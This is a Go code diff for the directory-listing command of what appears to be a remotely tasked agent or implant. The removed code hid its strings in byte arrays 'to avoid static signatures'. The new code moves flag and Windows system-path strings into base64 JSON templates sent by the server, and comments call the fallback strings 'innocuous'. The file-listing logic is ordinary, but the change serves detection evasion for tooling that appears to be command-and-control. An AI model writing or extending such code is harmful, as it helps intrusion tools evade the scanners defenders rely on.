@@ -6,6 +6,8 @@
 package main
 
 import (
+	"encoding/base64"
+	"encoding/json"
 	"fmt"
 	"os"
 	"path/filepath"
@@ -16,40 +18,46 @@ import (
 	"time"
 )
 
-// Ls flag strings (constructed to avoid static signatures)
-var (
-	// Flag arguments
-	lsMaxDepthPfx   = string([]byte{0x2d, 0x2d, 0x6d, 0x61, 0x78, 0x2d, 0x64, 0x65, 0x70, 0x74, 0x68, 0x3d}) // --max-depth=
-	lsCount         = string([]byte{0x2d, 0x2d, 0x63, 0x6f, 0x75, 0x6e, 0x74})                               // --count
-	lsExclude       = string([]byte{0x2d, 0x2d, 0x65, 0x78, 0x63, 0x6c, 0x75, 0x64, 0x65})                   // --exclude
-	lsFilterLong    = string([]byte{0x2d, 0x2d, 0x66, 0x69, 0x6c, 0x74, 0x65, 0x72})                         // --filter
-	lsFilterIgnore  = string([]byte{0x2d, 0x2d, 0x66, 0x69, 0x6c, 0x74, 0x65, 0x72, 0x2d, 0x69, 0x67, 0x6e, 0x6f, 0x72, 0x65}) // --filter-ignore
-	lsFilterShort   = string([]byte{0x2d, 0x66})                                                             // -f
-	lsFilterIShort  = string([]byte{0x2d, 0x69})                                                             // -i
+// LsTemplate receives string templates from server
+type LsTemplate struct {
+	Version   int      `json:"v"`
+	Type      int      `json:"t"`
+	Templates []string `json:"tpl"`
+	Params    []string `json:"p"`
+}
 
-	// Size format units
-	lsSizeUnits = string([]byte{0x4b, 0x4d, 0x47, 0x54, 0x50, 0x45}) // KMGTPE
+// LS template indices (must match server's common.go)
+const (
+	// Windows system paths to filter
+	idxLsWinSysVolInfo = 200 // System Volume Information
+	idxLsWinRecycleBin = 201 // $Recycle.Bin
+	idxLsWinConfigMsi  = 202 // Config.Msi
+	idxLsWinPagefile   = 203 // pagefile.sys
+	idxLsWinHiberfil   = 204 // hiberfil.sys
+	idxLsWinSwapfile   = 205 // swapfile.sys
 
-	// Windows system paths (skipped during listing)
-	lsSysVolInfo   = string([]byte{0x53, 0x79, 0x73, 0x74, 0x65, 0x6d, 0x20, 0x56, 0x6f, 0x6c, 0x75, 0x6d, 0x65, 0x20, 0x49, 0x6e, 0x66, 0x6f, 0x72, 0x6d, 0x61, 0x74, 0x69, 0x6f, 0x6e}) // System Volume Information
-	lsRecycleBin   = string([]byte{0x24, 0x52, 0x65, 0x63, 0x79, 0x63, 0x6c, 0x65, 0x2e, 0x42, 0x69, 0x6e})                                                                               // $Recycle.Bin
-	lsConfigMsi    = string([]byte{0x43, 0x6f, 0x6e, 0x66, 0x69, 0x67, 0x2e, 0x4d, 0x73, 0x69})                                                                                           // Config.Msi
-	lsRecovery     = string([]byte{0x52, 0x65, 0x63, 0x6f, 0x76, 0x65, 0x72, 0x79})                                                                                                       // Recovery
-	lsProgramData  = string([]byte{0x50, 0x72, 0x6f, 0x67, 0x72, 0x61, 0x6d, 0x44, 0x61, 0x74, 0x61})                                                                                     // ProgramData
-	lsPagefile     = string([]byte{0x70, 0x61, 0x67, 0x65, 0x66, 0x69, 0x6c, 0x65, 0x2e, 0x73, 0x79, 0x73})                                                                               // pagefile.sys
-	lsHiberfile    = string([]byte{0x68, 0x69, 0x62, 0x65, 0x72, 0x66, 0x69, 0x6c, 0x2e, 0x73, 0x79, 0x73})                                                                               // hiberfil.sys
-	lsSwapfile     = string([]byte{0x73, 0x77, 0x61, 0x70, 0x66, 0x69, 0x6c, 0x65, 0x2e, 0x73, 0x79, 0x73})                                                                               // swapfile.sys
+	// OS identifiers
+	idxLsOsWindows = 210 // windows
+	idxLsOsLinux   = 211 // linux
+	idxLsOsDarwin  = 212 // darwin
 
-	// OS names
-	lsOSWindows = string([]byte{0x77, 0x69, 0x6e, 0x64, 0x6f, 0x77, 0x73}) // windows
-	lsOSLinux   = string([]byte{0x6c, 0x69, 0x6e, 0x75, 0x78})             // linux
-	lsOSDarwin  = string([]byte{0x64, 0x61, 0x72, 0x77, 0x69, 0x6e})       // darwin
-
-	// Windows root path
-	lsWinRoot = string([]byte{0x43, 0x3a, 0x5c}) // C:\
+	// Flags (short form - server transforms long flags before sending)
+	idxLsFlagMaxDepth = 213 // -d
+	idxLsFlagCount    = 214 // -c
+	idxLsFlagExclude  = 215 // -e
+	idxLsFlagIgnore   = 216 // -i
+	idxLsFlagFilter   = 217 // -f
 )
 
-type LsCommand struct{}
+// Minimal fallback strings (innocuous)
+var (
+	lsSizeUnits = string([]byte{0x4b, 0x4d, 0x47, 0x54, 0x50, 0x45}) // KMGTPE
+	lsWinRoot   = string([]byte{0x43, 0x3a, 0x5c})                   // C:\
+)
+
+type LsCommand struct {
+	tpl *LsTemplate
+}
 
 type lsOptions struct {
 	humanReadable   bool     // -h
@@ -57,9 +65,9 @@ type lsOptions struct {
 	showHidden      bool     // -a (show hidden files)
 	filters         []string // -f patterns (case-sensitive filters)
 	filtersIgnore   []string // -i patterns (case-insensitive filters)
-	excludePatterns []string // --exclude patterns
-	maxDepth        int      // --max-depth=N (limit recursion depth, -1 = unlimited)
-	countOnly       bool     // --count (show only counts, not file listing)
+	excludePatterns []string // -e patterns (exclude)
+	maxDepth        int      // -d=N (limit recursion depth, -1 = unlimited)
+	countOnly       bool     // -c (show only counts, not file listing)
 }
 
 type dirStats struct {
@@ -67,21 +75,38 @@ type dirStats struct {
 	directories int
 }
 
+// getTpl safely retrieves a template string by index
+func (c *LsCommand) getTpl(idx int) string {
+	if c.tpl != nil && c.tpl.Templates != nil && idx < len(c.tpl.Templates) {
+		return c.tpl.Templates[idx]
+	}
+	return ""
+}
+
 // parseFlags parses command line flags for ls
-func parseFlags(args []string) ([]string, lsOptions, error) {
+func (c *LsCommand) parseFlags(args []string) ([]string, lsOptions, error) {
 	opts := lsOptions{
 		maxDepth: -1, // Default to unlimited depth
 	}
 	var remainingArgs []string
+
+	// Get flag strings from template
+	flagMaxDepth := c.getTpl(idxLsFlagMaxDepth) // -d
+	flagCount := c.getTpl(idxLsFlagCount)       // -c
+	flagExclude := c.getTpl(idxLsFlagExclude)   // -e
+	flagFilter := c.getTpl(idxLsFlagFilter)     // -f
+	flagIgnore := c.getTpl(idxLsFlagIgnore)     // -i
+
+	maxDepthPrefix := flagMaxDepth + "="
 
 	i := 0
 	for i < len(args) {
 		arg := args[i]
 
 		if strings.HasPrefix(arg, "-") {
-			// Check for --max-depth=N flag
-			if strings.HasPrefix(arg, lsMaxDepthPfx) {
-				depthStr := strings.TrimPrefix(arg, lsMaxDepthPfx)
+			// Check for -d=N flag (max depth)
+			if strings.HasPrefix(arg, maxDepthPrefix) {
+				depthStr := strings.TrimPrefix(arg, maxDepthPrefix)
 				depth, err := strconv.Atoi(depthStr)
 				if err != nil || depth < 0 {
 					return nil, opts, fmt.Errorf(ErrCtx(E22, depthStr))
@@ -91,15 +116,15 @@ func parseFlags(args []string) ([]string, lsOptions, error) {
 				continue
 			}
 
-			// Check for --count flag
-			if arg == lsCount {
+			// Check for -c flag (count only)
+			if arg == flagCount {
 				opts.countOnly = true
 				i++
 				continue
 			}
 
-			// Check for --exclude flag
-			if arg == lsExclude {
+			// Check for -e flag (exclude)
+			if arg == flagExclude {
 				if i+1 >= len(args) {
 					return nil, opts, fmt.Errorf(Err(E20))
 				}
@@ -108,15 +133,18 @@ func parseFlags(args []string) ([]string, lsOptions, error) {
 				continue
 			}
 
-			// Check if it's a flag that requires a value
-			if arg == lsFilterShort || arg == lsFilterLong {
+			// Check for -f flag (filter, case-sensitive)
+			if arg == flagFilter {
 				if i+1 >= len(args) {
 					return nil, opts, fmt.Errorf(Err(E20))
 				}
 				opts.filters = append(opts.filters, args[i+1])
 				i += 2
 				continue
-			} else if arg == lsFilterIShort || arg == lsFilterIgnore {
+			}
+
+			// Check for -i flag (filter, case-insensitive)
+			if arg == flagIgnore {
 				if i+1 >= len(args) {
 					return nil, opts, fmt.Errorf(Err(E20))
 				}
@@ -125,7 +153,7 @@ func parseFlags(args []string) ([]string, lsOptions, error) {
 				continue
 			}
 
-			// Handle single-letter flags that can be combined
+			// Handle single-letter flags that can be combined (-hRa)
 			for _, flag := range arg[1:] {
 				switch flag {
 				case 'h':
@@ -135,8 +163,7 @@ func parseFlags(args []string) ([]string, lsOptions, error) {
 				case 'a':
 					opts.showHidden = true
 				default:
-					// Check if it's part of a combined flag like -hRf
-					// If we hit 'f' or 'i', it needs to be handled separately
+					// f and i need values, can't be combined
 					if flag == 'f' || flag == 'i' {
 						return nil, opts, fmt.Errorf(Err(E20))
 					}
@@ -167,7 +194,7 @@ func matchesFilter(name string, opts lsOptions) bool {
 		}
 	}
 
-	// If no inclusion filters specified, match everything (that passed hidden and exclusion checks)
+	// If no inclusion filters specified, match everything
 	if len(opts.filters) == 0 && len(opts.filtersIgnore) == 0 {
 		return true
 	}
@@ -223,19 +250,41 @@ func formatSize(size int64, humanReadable bool) string {
 	return fmt.Sprintf("%9.1f %cB", float64(size)/float64(div), lsSizeUnits[exp])
 }
 
-func listDirectory(path string, opts lsOptions, currentDepth int, stats *dirStats) (string, error) {
-	// MODIFIED: Use NetworkAwareReadDir instead of os.ReadDir
+// isSystemPath checks if a path should be skipped on Windows
+func (c *LsCommand) isSystemPath(name string) bool {
+	sysVolInfo := c.getTpl(idxLsWinSysVolInfo)
+	recycleBin := c.getTpl(idxLsWinRecycleBin)
+	configMsi := c.getTpl(idxLsWinConfigMsi)
+	pagefile := c.getTpl(idxLsWinPagefile)
+	hiberfil := c.getTpl(idxLsWinHiberfil)
+	swapfile := c.getTpl(idxLsWinSwapfile)
+
+	return name == sysVolInfo || name == recycleBin || name == configMsi ||
+		name == pagefile || name == hiberfil || name == swapfile
+}
+
+// isSystemDir checks if a directory should be skipped during recursion on Windows
+func (c *LsCommand) isSystemDir(name string) bool {
+	sysVolInfo := c.getTpl(idxLsWinSysVolInfo)
+	recycleBin := c.getTpl(idxLsWinRecycleBin)
+	configMsi := c.getTpl(idxLsWinConfigMsi)
+
+	return name == sysVolInfo || name == recycleBin || name == configMsi
+}
+
+func (c *LsCommand) listDirectory(path string, opts lsOptions, currentDepth int, stats *dirStats) (string, error) {
 	entries, err := NetworkAwareReadDir(path)
 	if err != nil {
 		return "", fmt.Errorf(ErrCtx(E3, path))
 	}
 
-	// Sort entries: directories first (if sortDirsFirst is true), then alphabetically
+	// Sort entries alphabetically
 	sort.Slice(entries, func(i, j int) bool {
 		return entries[i].Name() < entries[j].Name()
 	})
 
 	var output strings.Builder
+	osWindows := c.getTpl(idxLsOsWindows)
 
 	// Check if there are any matching entries before printing header
 	hasMatchingEntries := false
@@ -272,20 +321,17 @@ func listDirectory(path string, opts lsOptions, currentDepth int, stats *dirStat
 				}
 
 				// Skip system directories on Windows
-				if runtime.GOOS == lsOSWindows && currentDepth == 0 {
-					name := entry.Name()
-					if name == lsSysVolInfo || name == lsRecycleBin ||
-						name == lsConfigMsi || name == lsRecovery || name == lsProgramData {
+				if runtime.GOOS == osWindows && currentDepth == 0 {
+					if c.isSystemDir(entry.Name()) {
 						continue
 					}
 				}
 
 				subPath := filepath.Join(path, entry.Name())
-				_, _ = listDirectory(subPath, opts, currentDepth+1, stats)
-				// Ignore errors and continue counting
+				_, _ = c.listDirectory(subPath, opts, currentDepth+1, stats)
 			}
 		}
-		return "", nil // Return empty string for count-only mode
+		return "", nil
 	}
 
 	// Only write header if there are matching entries
@@ -304,16 +350,14 @@ func listDirectory(path string, opts lsOptions, currentDepth int, stats *dirStat
 		output.WriteString(Table(TLS, matchCount) + "\n")
 
 		for _, entry := range entries {
-			// Skip entries that don't match the filter (including hidden files check)
+			// Skip entries that don't match the filter
 			if !matchesFilter(entry.Name(), opts) {
 				continue
 			}
 
 			// Skip system files on Windows root
-			if runtime.GOOS == lsOSWindows && currentDepth == 0 {
-				name := entry.Name()
-				if name == lsSysVolInfo || name == lsRecycleBin ||
-					name == lsPagefile || name == lsHiberfile || name == lsSwapfile {
+			if runtime.GOOS == osWindows && currentDepth == 0 {
+				if c.isSystemPath(entry.Name()) {
 					continue
 				}
 			}
@@ -324,7 +368,7 @@ func listDirectory(path string, opts lsOptions, currentDepth int, stats *dirStat
 			}
 
 			// Get permissions string
-			perms := formatPermissions(info)
+			perms := c.formatPermissions(info)
 
 			// Type indicator (0=file, 1=dir)
 			typeStr := RFile
@@ -369,17 +413,14 @@ func listDirectory(path string, opts lsOptions, currentDepth int, stats *dirStat
 				}
 
 				// Skip system directories on Windows
-				if runtime.GOOS == lsOSWindows && currentDepth == 0 {
-					name := entry.Name()
-					if name == lsSysVolInfo || name == lsRecycleBin ||
-						name == lsConfigMsi || name == lsRecovery || name == lsProgramData {
+				if runtime.GOOS == osWindows && currentDepth == 0 {
+					if c.isSystemDir(entry.Name()) {
 						continue
 					}
 				}
 
-				// For recursive listing, we traverse directories within depth limit
 				subPath := filepath.Join(path, entry.Name())
-				subOutput, err := listDirectory(subPath, opts, currentDepth+1, stats)
+				subOutput, err := c.listDirectory(subPath, opts, currentDepth+1, stats)
 				if err != nil {
 					continue
 				}
@@ -394,12 +435,39 @@ func listDirectory(path string, opts lsOptions, currentDepth int, stats *dirStat
 }
 
 func (c *LsCommand) Execute(ctx *CommandContext, args []string) CommandResult {
+	// Parse template from Command.Data - required for operation
+	if ctx.CurrentCommand == nil || ctx.CurrentCommand.Data == "" {
+		return CommandResult{
+			Output:      Err(E18),
+			ExitCode:    1,
+			CompletedAt: time.Now().Format(time.RFC3339),
+		}
+	}
+
+	decoded, err := base64.StdEncoding.DecodeString(ctx.CurrentCommand.Data)
+	if err != nil {
+		return CommandResult{
+			Output:      Err(E18),
+			ExitCode:    1,
+			CompletedAt: time.Now().Format(time.RFC3339),
+		}
+	}
+
+	c.tpl = &LsTemplate{}
+	if err := json.Unmarshal(decoded, c.tpl); err != nil {
+		return CommandResult{
+			Output:      Err(E18),
+			ExitCode:    1,
+			CompletedAt: time.Now().Format(time.RFC3339),
+		}
+	}
+
 	ctx.mu.RLock()
 	targetDir := ctx.WorkingDir
 	ctx.mu.RUnlock()
 
 	// Parse flags
-	remainingArgs, opts, err := parseFlags(args)
+	remainingArgs, opts, err := c.parseFlags(args)
 	if err != nil {
 		return CommandResult{
 			Error:       err,
@@ -444,18 +512,13 @@ func (c *LsCommand) Execute(ctx *CommandContext, args []string) CommandResult {
 		}
 	}
 
-	// Special handling for root directory listing
-	if (filepath.Clean(targetDir) == "/" || filepath.Clean(targetDir) == lsWinRoot) && opts.recursive && opts.maxDepth == -1 {
-		// Skip warning in production builds
-	}
-
 	// Initialize stats if counting
 	var stats *dirStats
 	if opts.countOnly {
 		stats = &dirStats{}
 	}
 
-	output, err := listDirectory(targetDir, opts, 0, stats)
+	output, err := c.listDirectory(targetDir, opts, 0, stats)
 	if err != nil {
 		return CommandResult{
 			Error:       err,
@@ -466,11 +529,10 @@ func (c *LsCommand) Execute(ctx *CommandContext, args []string) CommandResult {
 		}
 	}
 
-	// Handle count-only output - format: T:M:files,dirs
+	// Handle count-only output
 	if opts.countOnly {
 		output = fmt.Sprintf("%s%d,%d", TLSCount, stats.files, stats.directories)
 	} else if output == "" && (len(opts.filters) > 0 || len(opts.filtersIgnore) > 0) {
-		// If filtering is enabled and no results
 		output = SuccCtx(S0, "0")
 	}
 
@@ -482,9 +544,13 @@ func (c *LsCommand) Execute(ctx *CommandContext, args []string) CommandResult {
 }
 
 // formatPermissions handles permission formatting
-func formatPermissions(info os.FileInfo) string {
+func (c *LsCommand) formatPermissions(info os.FileInfo) string {
+	osWindows := c.getTpl(idxLsOsWindows)
+	osLinux := c.getTpl(idxLsOsLinux)
+	osDarwin := c.getTpl(idxLsOsDarwin)
+
 	switch runtime.GOOS {
-	case lsOSLinux, lsOSDarwin:
+	case osLinux, osDarwin:
 		// Unix-like permission format (e.g., rwxr-xr-x)
 		mode := info.Mode()
 		var perms strings.Builder
@@ -515,7 +581,7 @@ func formatPermissions(info os.FileInfo) string {
 
 		return perms.String()
 
-	case lsOSWindows:
+	case osWindows:
 		mode := info.Mode()
 		attrs := make([]string, 4)
 
@@ -524,7 +590,7 @@ func formatPermissions(info os.FileInfo) string {
 			attrs[i] = "-"
 		}
 
-		// Check if writable (if not writable, mark as read-only)
+		// Check if writable
 		if mode&0200 == 0 {
 			attrs[0] = "R"
 		}
